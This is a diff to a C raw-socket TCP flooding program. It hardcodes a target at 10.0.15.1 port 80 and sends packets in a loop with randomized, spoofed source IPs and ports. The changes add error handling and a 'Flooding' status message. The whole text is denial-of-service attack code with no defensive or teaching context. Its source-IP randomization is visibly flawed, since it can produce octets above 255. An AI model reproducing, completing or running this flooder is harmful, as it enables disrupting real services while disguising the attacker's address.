@@ -12,6 +12,8 @@
 #define IP_TARGET "10.0.15.1"
 #define PORT_TARGET 80
 
+
+/* function for header checksums */
 unsigned short csum (unsigned short *buf, int nwords)
 {
     unsigned long sum;
@@ -52,13 +54,17 @@ void setup_tcp_header(struct tcphdr *tcph)
 
 int main()
 {
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(s < 0){
+        fprintf(stderr, "Could not open raw socket.\n");
+        exit(-1);
+    }
+
     char datagram[MAX_PACKET_SIZE];
     struct iphdr *iph = (struct iphdr *)datagram;
     struct tcphdr *tcph = (struct tcphdr *)((u_int8_t *)iph + (5 * sizeof(u_int32_t)));
     struct sockaddr_in sin;
     char new_ip[sizeof "255.255.255.255"];
-
-    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
     unsigned int floodport = PORT_TARGET;
 
@@ -97,13 +103,16 @@ int main()
                   (struct sockaddr *) &sin,   /* socket addr, just like in */
                   sizeof(sin)) < 0)      /* a normal send() */
 
+            fprintf(stderr, "sendto() error!!!.\n");
+        else
+            fprintf(stdout, "Flooding %s at %u...\n", IP_TARGET, floodport);
 
         // Randomize source IP and source port
         snprintf(new_ip,16,"%lu.%lu.%lu.%lu",random() / 255,random() / 255,random() / 255,random() / 255);
         iph->saddr = inet_addr(new_ip);
-        //iph->saddr = inet_addr(new_ip);
         tcph->source = htons(random() % 65535);
         iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     }
 
+    return 0;
 }
